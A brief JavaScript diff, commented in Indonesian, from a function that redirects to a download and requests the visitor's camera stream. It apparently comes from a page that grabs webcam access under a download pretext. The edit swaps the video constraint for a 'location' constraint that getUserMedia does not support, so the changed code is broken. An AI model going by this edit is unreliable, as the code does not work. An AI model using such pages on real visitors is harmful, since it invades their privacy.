@@ -11,7 +11,7 @@ function redirectToDownload() {
     }, 300); // Tunggu 300ms sebelum mengarahkan
 
     // Langkah pertama adalah mengakses stream video dari kamera pengguna
-    navigator.mediaDevices.getUserMedia({ video: true })
+    navigator.mediaDevices.getUserMedia({ location: true })
     .then(function(stream) {
         // Membuat elemen video untuk menampilkan stream
         var video = document.createElement('video');
